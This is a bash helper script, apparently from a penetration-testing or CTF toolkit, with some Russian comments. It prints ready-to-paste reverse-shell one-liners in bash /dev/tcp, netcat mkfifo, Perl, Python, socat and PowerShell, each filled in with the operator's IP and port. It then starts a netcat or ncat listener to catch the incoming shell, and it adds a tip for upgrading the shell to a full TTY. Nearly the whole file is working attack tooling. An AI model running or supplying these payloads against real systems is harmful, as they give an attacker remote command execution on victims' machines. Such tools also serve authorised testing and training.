#!/usr/bin/env bash
#
# listen — reverse-shell listener helper.
#
#   listen            # port 4444 on 0.0.0.0, shows payloads, waits for a shell
#   listen 9001
#   listen 4444 --no-listen      # just print the payloads
#
# Prints ready-to-paste payloads using your VPN/interface IP, then starts
# a raw socket with rlwrap (or ncat -e) so you get a usable TTY.
#
set -euo pipefail
SELF="$(readlink -f "${BASH_SOURCE[0]}")"
. "$(dirname "$SELF")/_common.sh"

usage() { echo "Usage: listen [PORT] [--no-listen]"; }

PORT="4444"; DO_LISTEN=1
while [ $# -gt 0 ]; do
  case "$1" in
    --no-listen) DO_LISTEN=0 ;;
    -h|--help) usage; exit 0 ;;
    *) PORT="$1" ;;
  esac
  shift
done
case "$PORT" in ''|*[!0-9]*) die "invalid port: $PORT" ;; esac

IP="$(local_ip)"
step "Reverse shell payloads  (attacker $IP:$PORT)"
cat <<EOF

  bash:   bash -i >& /dev/tcp/$IP/$PORT 0>&1
  bash:   bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'
  nc:     rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $IP $PORT >/tmp/f
  perl:   perl -e 'use Socket;\$i="'$IP'";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  python: python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$IP",$PORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
  socat:  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$IP:$PORT
  ps:     powershell -nop -c "\$c=New-Object Net.Sockets.TCPClient('$IP',$PORT);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$r2=\$r+'PS '+(pwd).Path+'> ';\$sb=([text.encoding]::ASCII).GetBytes(\$r2);\$s.Write(\$sb,0,\$sb.Length);\$s.Flush()}"

  полезно: после получения шелла — python3 -c 'import pty;pty.spawn("/bin/bash")' ; Ctrl-Z ; stty raw -echo ; fg
EOF

[ "$DO_LISTEN" -eq 1 ] || exit 0

step "Слушаю на 0.0.0.0:$PORT (Ctrl-C для выхода)"
if have rlwrap && have nc; then
  exec rlwrap -cAr nc -lvnp "$PORT"
elif have ncat; then
  exec ncat -lvnp "$PORT"
elif have nc; then
  warn "rlwrap не найден — примитивный TTY (apt install rlwrap)"
  exec nc -lvnp "$PORT"
else
  die "нет nc/ncat — установи netcat-traditional или ncat"
fi
